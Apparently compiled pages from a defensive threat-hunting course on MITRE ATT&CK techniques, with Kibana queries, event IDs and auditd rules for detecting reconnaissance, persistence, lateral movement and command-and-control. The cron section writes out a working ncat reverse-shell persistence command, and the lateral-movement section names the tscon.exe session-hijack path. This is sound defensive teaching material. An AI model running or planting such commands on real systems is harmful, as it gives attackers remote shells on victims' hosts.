Adversaries phish for information by sending malicious messages with the intent to obtain sensitive information. Phishing for information relies on an adversary’s ability to trick victims by posing as a legitimate persona or organization. An adversary then attempts to collect critical information such as usernames, passwords, names, addresses, or contact information. There is no bad information in the reconnaissance stage of a campaign. All information is considered useful. An example of phishing during active reconnaissance is Advanced Persistent Threat 28 (APT28). According to MITRE ATT&CK®, this threat group used phishing to obtain and exploit credentials.

﻿

Searching Closed Sources ﻿

An adversary may obtain or purchase information through alternative, non-reputable sources or locations. The information they receive may be used in either ongoing or future campaigns. The information is typically collected from previous campaigns or data breaches that were conducted by other adversaries.

﻿

Searching Open Sources (Databases, Domains, Websites) ﻿

Adversaries may find the information they need through open sources. This includes open technical databases (T1596) as well as open websites and domains (T1593). Datastores pertaining to technical artifacts may provide information such as the registration of domains or previous network scans. Open and public websites, domains, or social media accounts may provide business-related information such as hiring needs or awarded contracts.

Hunting for Reconnaissance Hunting for adversary activity is significantly easier when analysts recognize the tools adversaries use on the network. Nmap is a primary tool for active reconnaissance. Nmap provides the features and capabilities necessary for adversaries to identify network components and design. Nmap also leaves evidence and artifacts of its activities for analysts to investigate during a hunt.

﻿

Nmap Overview ﻿

Nmap is a free and open-source utility for network discovery and security auditing. Nmap is a common tool used by the adversary to conduct reconnaissance activities. This utility provides users the capability to scan and derive information about devices on the network. Scanning with Nmap provides data about a device's Operating System (OS) and the ports being used.

﻿

Hunting Overview ﻿

Hunting for active reconnaissance requires searching for artifacts left by Nmap in network connection logs such as host or Zeek logs. Once ingested into a SIEM, analysts can view and analyze the logs to identify anomalous connection patterns.

﻿

Host Logs﻿

﻿

Log files are collected on a variety of hosts and provide information for identifying active reconnaissance activity. Any log file that contains information regarding network connections and communications is useful in a hunt for active reconnaissance activity. Hosts that contain an EDR agent, host-based firewalls, or an Intrusion Detection System (IDS) agent provide the necessary logs for analysts to review. The log files collected on the hosts can be forwarded to a Security Information and Event Manager (SIEM), such as Elastic Stack or Splunk, for expanded visualization and analysis. Logs that collect processes provide analysts with details on both active and passive reconnaissance activity.

﻿

Zeek Connection Logs﻿

﻿

Hunting and detecting reconnaissance activity rely on ample and accurate network information aggregation. One tool that provides the necessary network information is Zeek, a free and open-source software network analysis framework. Zeek provides network data logs regarding network connections. These logs include a comprehensive record of every connection it catches on the wire. The data includes fields such as Hypertext Transfer Protocol (HTTP) sessions with their requested Uniform Resource Identifier (URIs) and Domain Name Service (DNS) requests with replies.

﻿

SIEM﻿

﻿

A SIEM such as Elastic Stack or Splunk provides the necessary data housing and visualization platforms for Zeek logs. Defense analysts hunt reconnaissance activity by using a SIEM to manipulate and analyze the Zeek logs. One component of Nmap that is quickly searchable in a SIEM is the number of ports associated with a given IP address. Nmap scans the top 1000 ports by default and creates a data table that displays source IP address, destination IP address, and number of destination ports. A visualization based on the number of ports scanned reveals the instances where Nmap was used. This lesson demonstrates this detection method in a later section.

Which statement describes the reconnaissance technique of phishing for information? Send malicious messages with the intent to obtain sensitive information.

Which statement describes the reconnaissance technique of active scanning? ﻿ Exploitation TTP Overview The most common exploitation TTPs are privilege escalation, Local Code Execution (LCE), and Remote Code Execution (RCE). Understanding how these exploits work is key to detecting their presence and defending against them.

﻿

Privilege Escalation ﻿

Privilege escalation is when adversaries circumvent user account privileges to perform actions on systems with higher-level permissions. Systems typically limit privileges to control the operations a user can perform on a machine. However, different vulnerability exploits create workarounds and new ways to execute system instruction at a higher privilege level. Windows attracts common exploits such as access token manipulation. This exploit occurs when the active Windows session token is manipulated to perform tasks, often at the administrative level. Dynamic Link Library (DLL) hijacking is another example in which a trusted system DLL is manipulated to execute code. Since the DLL is associated with an application that runs at the system level, the permissions of the malicious code also run with system permissions. There are many more privilege escalation exploitation techniques, but these examples provide a starting point when looking for potential compromise. An example of a real-world privilege escalation exploit is the Colonial Pipeline Breach.

﻿

LCE and RCE ﻿

Unintentional code bugs are the root cause of many application vulnerabilities. These bugs pave the way for an adversary to take advantage of program behavior that extends beyond the program’s capabilities. A code execution vulnerability in a program also usually creates a privilege escalation path for adversaries as well. This is because most code execution exploits are able to take advantage of the user account that is running the malicious program. For example, a vulnerability may allow an adversary to manipulate a spreadsheet program into installing another application, such as ransomware or a cryptocurrency miner. Additionally, if an exploit manages to execute code during a process used by the Windows System account, the code runs with full system user privileges. Code execution vulnerabilities are some of the most common and desirable exploitation methods because of the vast utility they offer to an adversary. An example of an infamous remote code execution exploit is Log4Shell.

This filter displays abnormal requests. Although there are not many requests, there is an unusual detail in the destination ports that is worth a closer look. The top count is in the dynamic Remote Procedure Call (RPC) range. This may imply that the system requesting data from the server was repeatedly requesting much more of the same kind of information. Corroborating the DNS query data and the dynamic port data with raw logs on a host possibly points to more specific activity that details the information the potentially malicious source requested.

After identifying hosts as potential subjects of exploitation, analysts pursuing more thorough investigations of those hosts may uncover points of the initial breach, as well as indicators and methods of compromise. This information helps build a clearer picture of an adversary's attack chain.

source.ip:172.16.4.5 AND curl

Persistence Overview Persistence refers to the installation of an implant, backdoor, or access method that is able to restart or reinstall upon deactivation. The most common example of persistence is the ability of malicious code to survive and restart after a device reboots. Threat actors often configure persistence mechanisms on compromised devices in order to maintain a foothold in a network so they can return for future operations. If a compromised device is stable and rarely reboots, such as in the case of network devices, adversaries may opt out of configuring a persistence mechanism and leave only their malicious code running in memory. Malicious code that only exists in memory is much harder to detect by defenders but also cannot survive a reboot. To maintain persistence, artifacts must be saved on the system, which restarts the malicious code. Understanding persistence and knowing the common methods can help defenders detect and prevent threats from infecting their client environments.

﻿

Trainees learn commonly used persistence methods used on Windows and Linux, log sources required to catch persistence activity, and how to detect persistence activity using Security Onion. Example queries are based on Kibana Query Language (KQL) for searching within Elastic Stack.

Windows Persistence Threat actors use numerous methods to maintain persistence on a Windows host. Common methods used by attackers are Autorun locations, Background Intelligent Transfer Service (BITS) jobs, services, and scheduled tasks. It is critical to have proper logging configured before the attack occurs to detect these persistence methods. If logs are not being sent from the host to an off-device logging solution, an adversary can easily cover their tracks by wiping the logs on the localhost. However, if the logs have been exported to an aggregated logging solution, the task of covering up tracks becomes much more difficult.

﻿

Registry Run Keys ﻿

Registry run keys are one of the oldest persistence methods in Windows. To detect this method, it is required to log Sysmon Event ID 13: Registry value set. This event provides valuable information such as the user who created the key, the process that created the key, the target registry object, and the value. Detecting run key persistence requires searching for events where event.code is 13 and winlog.event_data.TargetObject contains parts of different run keys. A list of run keys can be found on the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) Registry Run Keys/Startup Folder page found in the Additional Resources.

﻿

The MITRE ATT&CK Framework is a valuable resource to explore for a list of registry locations to hunt for persistence. Another valuable resource, which provides a repository of rules, is Sigma. Sigma is a generic signature format for Security Information and Event Management (SIEM) systems. All the rules in the repository are freely available for anyone to use.

﻿

Scheduled Tasks ﻿

There are several methods to detect persistence via scheduled tasks. Enabling Microsoft-Windows-TaskScheduler/Operational within the Windows Event logging service provides the following six Event Identifiers (ID) specifically geared toward monitoring scheduled tasks:

Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registered

Event ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updated

Event ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deleted

Event ID 4698 on Windows 10, Server 2016 - Scheduled task created

Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled

Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled

Sysmon Event ID 1: Process create is another valuable event to detect persistence via scheduled tasks. Searching for events with an event.code of 1 and a process.pe.original_file_name of schtasks.exe provides the full command run to create the task as well as a host of other fields.

﻿

Windows BITS Jobs ﻿

BITS is a Windows feature that is often used for updaters and messengers. BITS jobs can be created and managed via the bitsadmin tool in the command line or the eight BitsTransfer cmdlets in PowerShell. The BITSAdmin Command-Line Interface (CLI) is deprecated but still works if it is installed on a system.

﻿

PowerShell script block logging (Event ID 4104: Execute a Remote Command), BITS Client logging (Event ID 3: New Job Created), and Sysmon Process Create logging (Event ID 1: Process Create) are several options to detect suspicious BITS activity. Searching for events with an event.code of 1, a process.command_line line that contains Transfer, Create, AddFile, SetNotifyCmdLine, SetMinRetryDelay, or Resume, and a process.pe.original_file_name of bitsadmin.exe returns BITSAdmin activity that can be analyzed for suspicious activity.

﻿

Services ﻿

Persistence via a service is another common method adversaries use. Detecting a potentially malicious service requires Windows System logs (Event ID 4697: A service was installed on the system or 7045: A new service was installed on the system) or Sysmon logs (Event ID 1: Process Create or 13: Registry Value Set). Existing service paths being modified, new services being spawned with non-typical paths, and suspicious execution of programs through services are all red flags to look for. When suspicious activity is found, it is always important to expand the search around the suspicious activity in an attempt to track it back to the threat actor’s initial entry point.

﻿

Valid features in the Operating System (OS) are often employed to obtain persistence. It is important for a defender to understand their environment to identify between normal and abnormal behaviors. Baselining an environment helps prevent false positives and enables actionable investigation outcomes.

Linux Persistence Much like Windows, there are also many different methods for a threat actor to maintain persistence on a Linux host. Common persistence methods include cron jobs, account creation, and logon scripts. Gain an understanding of the required logging and strategies to detect persistence on Linux hosts.

﻿

Cron Jobs ﻿

Cron jobs are the primary method used to create a persistent scheduled task in Linux. Adversaries use this Linux feature to configure persistence. There are many ways cron is used for persistence. For example, a cron job is created to run on reboot, which creates a netcat session. The session creates a reverse shell to the adversary’s box, which is listening for the connection. Below is an example of such a cron job:

@reboot sleep 200 && ncat 192.168.1.2 4242 -e /bin/bash ﻿

To detect this type of activity, Linux Audit Daemon (Auditd) rules need to be in place to audit when changes are made to the system's cron tables. Below are examples of auditd rules from Florian Roth's Auditd configuration available on GitHub:

-w /etc/cron.allow -p wa -k cron -w /etc/cron.deny -p wa -k cron -w /etc/cron.d/ -p wa -k cron -w /etc/cron.daily/ -p wa -k cron -w /etc/cron.hourly/ -p wa -k cron -w /etc/cron.monthly/ -p wa -k cron -w /etc/cron.weekly/ -p wa -k cron -w /etc/crontab -p wa -k cron -w /var/spool/cron/ -k cron The rule syntax follows the standard, which was pulled from the audit.rules man page:

-w path-to-file -p permissions -k keyname ﻿

The permissions include one of the following:

r: Read the file. w: Write to the file. x: Execute the file. a: Change the file's attribute. The default Auditbeat configuration parses the keyname from these audit rules to the tag field. This makes hunting using specific audit rules much more convenient. Check the audit rule keyname to hunt on and start hunting using a search similar to the following:

tag: cron ﻿

The downside to hunting for persistence via cron using logging is that the logs do not show the actual cron job. The only time persistence is logged is when one of the cron files is altered. This means that determining if a change to the cron jobs was malicious requires access to the endpoint to check the list of cron jobs using the following command:

crontab -l ﻿

Several events trigger when crontab is used to view cron jobs with -l or -e. However, when a change is made to a cron file, there are events with an event.action of renamed and changed-file-ownership-of. These events are important to audit. If a modification to cron jobs is detected on a host, the cron file that was modified should be reviewed for suspicious cron jobs.

﻿

Account Creation ﻿

Creating an account is another way a threat actor obtains persistence on a Linux system. Using the Elastic standard Auditbeat configuration captures the required data to detect this method of persistence. However, if a custom configuration is in use, it needs to have the system module’s user dataset enabled to monitor useradd activity.

﻿

To ensure accounts are not being created for persistence, events with an event.action of user_added and a system.audit.user.group.name of root should be audited. Root users should only be created when absolutely necessary so as to not create an excess of noise. However, this varies depending on the specific network being hunted on.

﻿

UNIX Shell Configuration Modification ﻿

Modifying profile configuration files in Linux is a common way threat actors gain persistence. It is as easy as echoing a malicious shell script into /etc/profile, /etc/.bashrc, or /etc/bash_profile (or other system or user shell configuration files) to call home to set up a reverse shell upon spawning of a new interactive or non-interactive shell. Using the file integrity module in Auditbeat allows for tracking changes to these profiles. An event with an event.action of updated or attributes_modified and a file.path of one of the profile paths (i.e., /etc/profile) indicates that the profile was modified. If this is observed, reviewing the profile modified on the host for changes is ideal, but if the host is unable to be accessed, expanding the search to view events surrounding the modification may reveal the threat actor’s command that made the change.

﻿

Network Flow ﻿

In addition to detecting persistence directly by looking for changes to files and commands being run, checking for beaconing activity can also provide valuable information. Auditbeat's system module provides events with an event.action of network_flow, which are useful for detecting suspicious beaconing activity using the search result chart in Kibana.

﻿

These are just a few examples of persistence methods threat actors use. To be a successful defender, continuous learning is a must. Keeping up to speed with MITRE ATT&CK helps stay current on methods used and how to properly hunt for the activity.

﻿Detecting Persistence Explained During the unassisted hunt for persistence, seven persistence methods were located in the logs. Explanations and detection of the following methods are revealed below:

Registry Run Keys

Scheduled Tasks

BITS Jobs

Services

Cron Jobs

Account Creation

UNIX Profile Configuration Modification

Registry Run Keys ﻿

Description ﻿

The user Administrator on the host eng-wkstn-1 created the object HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run\duck with the value of C:\duck.exe. Suspicion is raised any time an executable is located in the root of the C:\ directory.

﻿

Query agent.type: winlogbeat AND event.module: sysmon AND ((event.code: 13 AND winlog.event_data.TargetObject: "CurrentVersion\Run") OR (event.code: 1 AND process.pe.original_file_name: reg.exe AND process.command_line: "CurrentVersion\Run")) ﻿

False Positives ﻿

The user eng_user01 created a run key for OneDrive and, at first glance, it may look suspicious because the OneDrive.exe file it is pointing to is located in C:\Users\eng_user01\AppData\Local\Microsoft\OneDrive\OneDrive.exe. Normally, legitimate programs are installed in the Program Files folders, but AppData is often used because it does not require administrator privileges to install programs there.

﻿

Scheduled Tasks ﻿

Description ﻿

The user Administrator on the host eng-wkstn-1 created a scheduled task to execute C:\Users\Administrator\AppData\Local\duck.exe on login. While programs are sometimes installed to AppData locations, they are in a parent folder for the specific program and not dropped in the root of the Local or Roaming folders.

﻿

Query agent.type: winlogbeat AND event.dataset: process_creation AND event.module: sysmon AND event.code: 1 AND process.pe.original_file_name: schtasks.exe ﻿

False Positives ﻿

There was one event where the schtasks command was run with no flags.

﻿

BITS Jobs ﻿

Description ﻿

The user Administrator on the host eng-wkstn-1 used bitsadmin.exe to configure a BITSAdmin job that executed goose.exe that reaches out to the attacker’s machine in an attempt to open a backdoor.

﻿

Query agent.type: winlogbeat AND event.dataset: process_creation AND process.pe.original_file_name: "bitsadmin.exe" AND process.command_line: ("Transfer" OR "Create" OR "AddFile" OR "SetNotifyCmdLine" OR "SetMinRetryDelay" OR "Resume") ﻿

False Positives ﻿

No false positives appeared.

﻿

Services ﻿

Description ﻿

The user Administrator on the host eng-wkstn-1 attempted to start the suspicious service C:\Program Files\go.exe.

﻿

Query ﻿

The following query is used in Kibana's Lens application to take a quick glance at what services were created during the allotted hunt time range:

agent.type: winlogbeat AND event.dataset: system AND event.code: 7045 ﻿

Enter the following queries into the Lens:

event.code.keyword winlog.event_data.ImagePath ﻿

These reveal the suspicious service C:\Program Files\go.exe. Now that the name and path of the service are known, event.code 1 and 13 can be utilized to gather more information.

﻿

False Positives ﻿

No false positives appeared.

﻿

Cron Jobs ﻿

Description ﻿

Several cron jobs were created by the users JCTE and root on the host cups-server. These actions need further investigation by gaining direct access to the cups-server host or by using a tool like OSquery to query the cron jobs on the host.

﻿

Query agent.type: auditbeat AND event.module: auditd AND tags: cron AND event.action: ("renamed" OR "changed-file-ownership-of") ﻿

False Positives ﻿

No false positives appeared.

﻿

Account Creation ﻿

Description ﻿

A new user, larry, was created on the cups-server and was provided root privileges. This action requires validation to ensure it was approved activity. It can also be used as a jumping-off point for a deeper investigation to see if the user larry performed any suspicious activity after creation.

﻿

Query agent.type: auditbeat AND event.module: system AND event.dataset: user AND event.action: user_added ﻿ False Positives ﻿ No false positives appeared.

UNIX Profile Configuration Modification

Description ﻿ The user root modified /etc/profile on the cups-server host. This action requires validation to ensure it was approved activity.﻿

Query agent.type: auditbeat AND event.dataset: file AND event.action: (updated OR attributes_modified) AND file.path: "/etc/profile" ﻿ False Positives

No false positives appeared.

Windows Registry run keys Scheduled tasks BITS jobs Services

Linux Cron jobs Account creation UNIX profile configuration modification

Lateral Movement Overview Lateral movement consists of techniques that adversaries use to enter and control remote systems on a network. Following through on their primary objective often requires exploring the network to find their target and gain access to it. Reaching their objective often involves pivoting through multiple systems and accounts to gain a foothold in an environment. Adversaries might install Remote Access Tools (RAT) to accomplish lateral movement or use legitimate credentials with native network and Operating System (OS) tools, which are often more stealthy.

﻿

Lateral movement occurs when adversaries use various techniques to move within a network. Often, lateral movement requires multiple techniques chained together in order to reach the intended destination. Once inside the network, an adversary exploits remote services such as Secure Shell (SSH), Windows Remote Management (WinRM), Windows Management Instrumentation (WMI), and other SMB-based utilities that allow direct connection to the systems within a network.

﻿

There are usually several goals with lateral movement outside of infecting other computers within a network. Adversaries also target other systems within a network for persistence in order to have a continued presence on the network or use them for Command-and-Control (C2) purposes. These systems often have the data exfiltrated.

﻿

Systems that have long uptimes or that may be out of date and have direct access to the internet, are often prime targets for adversaries. Any system that is connected to the internet that has little usage is also a prime target, as an infection is less likely to be discovered.

Lateral Movement TTPs There are many different techniques that can be used for lateral movement, which is why it is very hard to detect threats moving throughout the network. Lateral movement is often used to enter and control remote systems on a network. In order to achieve their primary objectives, adversaries often explore the network in order to find their target and gain access to it. This often involves pivoting through multiple systems or accounts.

﻿

The following techniques are all from the MITRE ATT&CK framework. They are some of the most popular lateral movement techniques that adversaries are known to use.

Exploitation of Remote Services (T1210) Adversaries are known to exploit remote services to gain access to internal systems, once they are inside a network. Adversaries can exploit software vulnerabilities within a program or the OS to execute code. The goal is to enable access to a remote system.

Adversaries first need to determine if the remote system is vulnerable. This is done through discovery methods such as network service scanning to obtain a list of services running on the target to find one that may be vulnerable. This includes methods such as port scans and vulnerability scans. It typically uses tools that the adversary brings onto the system. Services that are commonly exploited are SMB, Remote Desktop Protocol (RDP), and applications that use internal networks such as MySQL (Structured Query Language).

﻿

Detecting software exploitation is difficult because some of the vulnerabilities may cause certain processes or applications to become unstable or crash. Look for abnormal behavior of processes such as suspicious files written to a disk or unusual network traffic. If application logs are accessible, this is a good place to look for evidence of lateral movement.

Remote Services (T1021) Adversaries that have already compromised and acquired valid user accounts and logins use them to access services specifically designed for remote connections such as SSH, Virtual Network Computing (VNC), and WinRM. If an adversary is able to obtain a set of valid domain credentials for an environment, they can essentially log in to any machine in the environment using remote services such as RDP or SSH.

﻿

If an adversary wishes to exfiltrate data as part of the lateral movement, they can use SMB to remotely connect to a network share. Windows also has hidden network shares that are only accessible to administrators to allow for remote file copy and other administrative functions. Some examples of these network shares include C$, ADMIN$, and IPC$. Adversaries use this technique in conjunction with an administrator-level account to remote access a network over SMB and transfer files or run transferred binaries through remote execution.

﻿

Adversaries take advantage of remote systems using WinRM, which is a Windows service and protocol that allows a user to interact with a remote system. This service can be called with the winrm command using a program such as PowerShell. WinRM can be used to remotely interact with other systems on a network and move laterally throughout an environment. When using WinRM remotely through PowerShell, the child process wsmprovhost.exe is spawned, which indicates an adversary is using remote code execution to laterally move within a network.

﻿

Adversaries take advantage of Windows administration tools, like PSExec, that are used for remotely managing hosts. PSExec is a lightweight standalone utility that allows interactive access to the programs it runs remotely. If an adversary has already obtained compromised credentials and has access to an environment, it can use PSExec to execute commands on another host. PSExec activity involves remote service creation events, which generate Windows Event Identifiers (ID) 7045. When PSExec is used, it spawns a PSEXEVC service, which should also be monitored.

﻿

When discovering or hunting for remote services lateral movement, correlate the use of login activity with remote services executed. Monitor user accounts logged into systems that they normally do not access or accounts that do not normally use remote services. Look for Windows Event ID 4624 pertaining to new user login sessions and Event ID 4648 for an attempted login. In addition, Windows Event IDs 5140 and 5145 relate to opening network shares. Monitor remote login events and any users connected to administrative shares for suspicious activity.

﻿

In addition, monitor network traffic such as Zeek connection logs and Sysmon Event ID 3 logs. For lateral movement techniques such as using WinRM, the service attempts to connect via port 5985 or 5986. Suspicious traffic often exploits ports such as port 22 for SSH or port 3389 for RDP.

Remote Service Session Hijacking (T1563) Pre-existing sessions with remote services are often exploited to move laterally in an environment. Users log into a service designed to accept remote connections such as SSH or RDP and establish a session that allows them to maintain continuous access to the remote system. Adversaries take control of these sessions to further their attacks using remote systems. This differs from the Exploitation of Remote Services because adversaries are hijacking an existing session rather than creating a new one using valid accounts.

﻿

Adversaries hijack a legitimate user's active SSH session by taking advantage of the trust relationships established with other systems via public key authentication. This happens when the SSH agent is compromised or access to the agent's socket is obtained.

Adversaries also hijack legitimate remote desktop sessions to laterally move throughout a network. Typically, a user is notified when someone is trying to take over their RDP session. With System permissions, and using this path for the Terminal Services Console c:\windows\system32\tscon.exe [session number to be stolen], an adversary can hijack a session without the need for credentials or alerting the user.

﻿

Detecting lateral movement within remote session hijacking is difficult because often the sessions are legitimate. Adversaries do not start a new session like some of the other techniques; they take over an existing one. Often the activity that occurs after a remote login attempt indicates suspicious activity. Monitor for user accounts that are logged into systems not normally accessed or multiple systems that are accessed within a short period of time.

Taint Shared Content (T1080) Threat actors deliver malicious payloads to remote systems by adding content to shared locations such as network drives or shared code repositories. This content can be corrupted by adversaries when they add malicious programs, scripts, or code to files that are otherwise normal. Once a user opens the file, the malicious content placed by an adversary is triggered, which can cause lateral movement within a network.

For example, malicious code is embedded into a shared Excel spreadsheet. When the infected file is shared within an organization, each machine that opens it becomes infected. This allows adversaries to hunt on each machine for their target data or account to accomplish their desired goals. Both binary and non-binary formats ending with the file extensions .exe, .dll, .bat, and .vbs are targeted.

﻿

Shared content that is tainted is often very difficult to detect. Any processes that write or overwrite many files to a network share are suspicious. Monitor processes that are executed from removable media and for malicious file types that do not typically exist in a shared directory.

se Alternate Authentication Material (T1550) If an adversary is unable to acquire valid credentials, they may use alternate authentication methods such as password hashes, kerberos tickets, or application access tokens to move laterally within an environment. Authentication processes require valid usernames and one or more authentication factors such as a password or Personal Identification Number (PIN). These methods generate legitimate alternate authentication material. This material is cached, which allows the system to validate the identity has been successfully verified without asking the user to reenter the authentication factors. The alternate material is maintained by the system, either in the memory or on the disk. Adversaries steal this alternate material through credential access techniques in order to bypass access controls without valid credentials.

﻿

When local commands are run that are meant to be executed on a remote system, like scheduling remote tasks, the local system passes its token to the remote system. If the currently active user has administrative credentials, they can execute the commands remotely.

﻿

Adversaries also use the Pass-the-Hash (PtH) attacks to steal password hashes in order to move laterally. PtH is a method of authenticating as a user without having access to the user's cleartext password. When performing this technique, valid password hashes are captured using various credential access techniques. Captured hashes are used to authenticate as that user. This allows adversaries to move laterally through an environment.

﻿

Detecting this lateral movement technique includes monitoring Windows Event IDs 4768 and 4769, which are generated when a user requests a new Ticket-Granting Ticket (TGT) or service ticket. All login and credential use events should also be audited and reviewed. Unusual remote logins, along with other suspicious activity, indicate something malicious is happening. New Technology Local Area Network (LAN) Manager (NTLM) Logon Type 3 authentications that are not associated with a domain logon are also suspicious.

Lateral Movement Tools Adversaries often use tools that are integrated into the OS to move laterally through the network and deliver malicious payloads.

PsExec: PsExec is a utility that is part of the Sysinternals suite. It is a command-line administration tool that administrators can use to remotely execute processes and manage systems. SCP (Secure Copy): The Unix-like Command-Line Interface (CLI) is used to transfer files between systems. This can be used to move malicious files across the network. Remote Session Tools (SSH, WinRM, SMB, RDP, WMI): The remote session protocols for Unix-like and Windows OSs. Threat actors may attempt to hijack a session or use compromised valid credentials in order to use these tools to move laterally across the network. Task Scheduler: A Windows tool used to achieve persistence and continuously execute malicious payloads. cron: A Linux tool, similar to Task Scheduler, that allows administrators to automate scheduled tasks at a set time. Used to achieve persistence and deliver malicious payloads.

Command and Control Overview What is Command and Control? ﻿

Each outbound beacon is an opportunity for defenders to detect malicious actors. These beacons provide the C2 protocol for the attackers. This means every exploit payload has some form of C2. The ubiquitous nature of C2 techniques means that being able to detect C2 behavior is critical to reduce the time an aggressor is able to maintain access within a network. This section details common C2 TTPs and defense evasion tactics.

﻿

Getting Around Firewalls ﻿

Many movies featuring hackers present network infiltration as the inevitable output of a few hours of rapid keyboard typing. However, the biggest idea these movies get wrong about cyber is firewalls. Threat actors are unlikely to gain direct access to a machine through the internet if a network firewall is blocking inbound traffic to the target workstation. However, there are other ways threat actors gain access to these machines that allow them to freely move around networks with firewalls.

﻿

Although a properly-configured network firewall blocks inbound traffic to host machines, these firewalls rarely block outgoing traffic to the internet. An organization may employ a network policy that only allows the web ports (80 and 443) outbound, but this does not stop hackers from being able to successfully control a system on the other side. This is possible with beaconing malware, which is a malicious agent on the victim's system that connects outbound to the attacker to provide command and control.

﻿

C2 TTPs ﻿

Attackers have to get over obstacles to successfully exploit systems. Table 3.5-1, below, presents the C2 TTPs that are common for attackers to use because they overcome the defenses that are commonly in place.

﻿

﻿

Table 3.5-1﻿

﻿

Application Layer Protocols (T1071) ﻿

The most common way malware communicates out of a network is through application layer protocols. In this technique, the attacker sets up a seemingly normal web server or File Transfer Protocol (FTP) server, then uses that network connection to control the endpoint. This activity is tricky to view on the network because it naturally blends in with legitimate application traffic.

﻿

Communication Through Removable Media (T1092) ﻿

Communicating through removable media allows attackers to transfer commands to hosts on networks without internet access. In 2008, the malware known as Agent.BTZ was used in a massive cyberattack against the United States (US) military. Agent.BTZ was able to gain access to both classified and unclassified networks. This malware was able to execute using the file autorun.inf, a technique that MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) describes in T1091. Removable media was being swapped back and forth between networks with and without internet access, so the attackers were able to perform C2 and data exfiltration actions.

﻿

Web Service (T1102) ﻿

An attacker may implement a C2 protocol using popular web services to communicate with malware. If an attacker is using a shopping website, for example, the malware simply needs to connect to a predefined product on that site and just read the comments. The attacker can then add in a seemingly benign comment such as, "This broke after 1 use, very bad, do not recommend." This comment signals the malware to behave in a certain way (T1102.003). Some malware may also make comments back on the same page as part of a bidirectional communication tactic (T1102.002).

﻿

A real-world example of this technique was discovered in 2017 with malware that is suspected to be Russian state-sponsored. The malware searches for specific commands in the comments on Britney Spears' Instagram page. The algorithm in the malware decodes the comments into C2 server domains. A regular expression matches certain letters in the comments and those letters become a shortened Uniform Resource Locator (URL) link that resolves to the actual C2 server.

﻿

Detecting this technique at the network layer is difficult because it requires more contextual information, such as the normal working hours for employees. A sudden increase in traffic to one Instagram profile should register as odd to defenders analyzing the network layer. At the host layer, detection options include viewing web requests from unknown binaries.

﻿

Traffic Signaling (T1205) ﻿

Systems connected directly to the internet are scanned often. The traffic signaling TTP works by delivering encoded commands as logs that seemingly come from random internet traffic. Port knocking (T1205.001) is a great example of this. As an example, the "magic" command may be two consecutive failed attempts on three predefined ports. The logs in this example would present data as follows:

Connection refused port 90 March 11 2022 12:25:14 PM

Connection refused port 90 March 11 2022 12:25:15 PM

Connection refused port 70 March 11 2022 12:25:16 PM

Connection refused port 70 March 11 2022 12:25:17 PM

Connection refused port 60 March 11 2022 12:25:18 PM

Connection refused port 60 March 11 2022 12:25:19 PM

﻿

This signals the malware to perform a predefined action. The actions may be creating a connection back to the system performing the knocking, opening up a port to connect inbound, or even deleting everything on the system.

﻿

C2 Defense Evasion Tactics ﻿

The ways around defensive signatures are numerous and limited only by the attacker's imagination. However, once defenders understand the C2 protocol, they can block it. Blocking may require expensive technology, but it is always possible. Part of understanding C2 protocols is recognizing that all of these evasion techniques have the goal of hiding suspicious traffic. Popular ways for attackers to evade defensive measures include Encryption (T1573) and Dynamic Resolution (T1568).

﻿

Encryption (T1573) ﻿

Encryption was created to improve security. This may seem ironic, considering that it can also be used to provide safe, secure communications for nefarious activities. Any off-the-shelf encryption algorithms provide what most hackers need. These algorithms can be either symmetric or asymmetric. Symmetric encryption is fast and secure, but does not help much with preventing unauthorized access. Asymmetric encryption allows software to be deployed without someone removing the key and issuing their own commands. The more unusual the communication protocol, the more obvious the encryption traffic is going to be.

﻿

Secure software typically starts with asymmetric encryption, then passes keys to continue the conversation with symmetric encryption algorithms because symmetric encryption is considerably faster to compute. While it is possible for hackers to do everything with asymmetric keys, it is considered bizarre because of the extreme amounts of computational power required for asymmetric encryption.

﻿

Dynamic Resolution (T1568) ﻿

Domain Name Systems (DNS) play an invisible role in all network communications. DNS is the source of several C2 defense evasion tactics including DNS Calculation (T1568.003), Fast Flux DNS (T1568.001), and Domain Generated Algorithms (DGA T1568.002).

﻿

DNS Calculation (T1568.003)﻿

﻿

When a computer sends a DNS request, it is asking for the Internet Protocol (IP) address associated with a domain, normally to connect to that IP address. With the DNS calculation tactic, the malware decodes a different IP address and potentially ports from the original address returned from the DNS query. This allows attackers to throw off a defender who may be looking for traffic to the IP provided by the DNS resolution. The specifics are limited only by the creativity of the malware author. The attacker may have the malware flip the IP address such that 1.2.3.4 becomes 4.3.2.1. Another possibility is pulling out a port from an IP address, such as changing 4.3.2.180 to 4.3.2.1:80.

﻿

Fast Flux DNS (T1568.001)﻿

﻿

DNS is not a 1:1 relationship. Multiple domains can resolve to the same IP address and multiple IP addresses can resolve to the same domain. In the case of a fast flux network, the attackers change the IP addresses associated with a single domain very rapidly. This makes it difficult to block an IP address since the registrations have an average life span of 5 mins.

﻿

Domain Generation Algorithms (DGA) (T1568.002)﻿

﻿

DGA makes it difficult to block a domain. If a piece of malware has a single domain hard-coded in the binary, then researchers can find that domain and proactively block it. DGAs work like two-factor security tokens that are constantly generating a 6-digit number based on a seed value. The malware tries to reach out to a randomly-generated domain name on a predefined time interval. When the attacker wants to communicate with the malware, the attacker just needs to register one of the millions of domains the malware tries to use. Since these algorithms are not truly random, the attacker knows the exact time or domain the malware will attempt to connect. Defensive tools that block domains typically do not accept DGAs as input. Blocking the DNS request is prohibitively difficult since DNS servers do not have unlimited resources.

C2 Logs and Data Sources Network-based logging provides the primary log and data sources for detecting C2 and data exfiltration. However, host analysts can gather relevant information from these sources, as well.

﻿

Gathering Network-Based Logs from the Host ﻿

Using the host to gather network logs is not ideal, but there are situations where this is the only option. The reason the network-based logs are a better choice is because the logging is centralized and difficult to tamper with.

﻿

To use the host, defenders can configure Sysmon to provide network log data. The Sysmon Events noted below, with their respective Identifiers (ID), provide important details that are available at the host level. This information is not provided at the network level.

Sysmon ID 3: Network Connections: Provides information with name resolution of the IP address.

Sysmon ID 22: DNS Query: Displays processes that make the query.

